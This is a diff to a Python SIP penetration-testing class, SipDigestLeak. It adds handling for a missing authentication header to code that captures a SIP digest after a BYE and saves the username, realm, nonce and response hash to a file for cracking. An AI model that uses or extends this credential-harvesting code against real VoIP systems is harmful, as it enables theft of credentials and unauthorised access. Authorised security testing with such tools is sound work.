@@ -335,7 +335,7 @@ class SipDigestLeak:
                 else:
                     resp = sock.recv(4096)
 
-                print(CYAN + '[<=] Received BYE with digest')
+                print(CYAN + '[<=] Received BYE')
 
                 if self.verbose == 1:
                     print(BWHITE + '[+] Receiving from %s:%s/%s ...' %
@@ -344,11 +344,15 @@ class SipDigestLeak:
 
                 headers = parse_message(resp.decode())
                 branch = headers['branch']
-                auth = headers['auth']
+
+                try:
+                    auth = headers['auth']
+                except:
+                    auth = ''
 
                 # send 200 OK
                 msg = create_response_ok(
-                    self.from_user, self.to_user, proto, self.domain, lport, cseq, branch, callid, tag, totag, '')
+                    self.from_user, self.to_user, proto, self.domain, lport, cseq, branch, callid, tag, totag)
 
                 print(YELLOW + '[=>] Request 200 Ok\n')
 
@@ -362,19 +366,22 @@ class SipDigestLeak:
                 else:
                     sock.sendto(bytes(msg[:8192], 'utf-8'), host)
 
-                print(BGREEN + 'Auth=%s\n' % auth + WHITE)
+                if auth != '':
+                    print(BGREEN + 'Auth=%s\n' % auth + WHITE)
 
-                headers = parse_digest(auth)
+                    headers = parse_digest(auth)
 
-                if self.ofile != '':
-                    data = '%s"%s"%s"%s"BYE"%s"%s"%s"%s"%s"MD5"%s' % (
-                        ip, local_ip, headers['username'], headers['realm'], headers['uri'], headers['nonce'], headers['cnonce'], headers['nc'], headers['qop'], headers['response'])
+                    if self.ofile != '':
+                        data = '%s"%s"%s"%s"BYE"%s"%s"%s"%s"%s"MD5"%s' % (
+                            ip, local_ip, headers['username'], headers['realm'], headers['uri'], headers['nonce'], headers['cnonce'], headers['nc'], headers['qop'], headers['response'])
 
-                    f = open(self.ofile, 'w')
-                    f.write(data)
-                    f.close()
+                        f = open(self.ofile, 'w')
+                        f.write(data)
+                        f.close()
 
-                    print(WHITE+'Auth data saved in file %s' % self.ofile)
+                        print(WHITE+'Auth data saved in file %s' % self.ofile)
+                else:
+                    print(BRED + 'No Auth Digest received :(\n' + WHITE)
         except socket.timeout:
             pass
         except:
